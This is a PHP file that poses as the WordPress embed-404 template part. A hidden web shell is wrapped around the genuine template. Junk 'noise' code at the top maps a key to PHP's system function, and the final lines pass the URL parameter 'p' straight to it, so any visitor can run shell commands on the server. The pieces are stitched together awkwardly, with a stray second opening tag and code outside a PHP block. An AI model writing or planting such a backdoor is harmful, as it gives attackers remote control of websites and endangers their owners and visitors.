<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Contains the post embed content template part
 *
 * When a post is embedded in an iframe, this file is used to create the content template part
 * output if the active theme does not include an embed-404.php template.
 *
 * @package WordPress
 * @subpackage Theme_Compat
 * @since 4.5.0
 */
?>
<div class="wp-embed">
	<p class="wp-embed-heading"><?php _e( 'Oops! That embed cannot be found.' ); ?></p>

	<div class="wp-embed-excerpt">
		<p>
			<?php
			printf(
				/* translators: %s: A link to the embedded site. */
				__( 'It looks like nothing was found at this location. Maybe try visiting %s directly?' ),
				'<strong><a href="' . esc_url( home_url() ) . '">' . esc_html( get_bloginfo( 'name' ) ) . '</a></strong>'
			);
			?>
		</p>
	</div>

	<?php
	/** This filter is documented in wp-includes/theme-compat/embed-content.php */
	do_action( 'embed_content' );
	?>

	<div class="wp-embed-footer">
		<?php the_embed_site_title(); ?>
	</div>
</div>

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>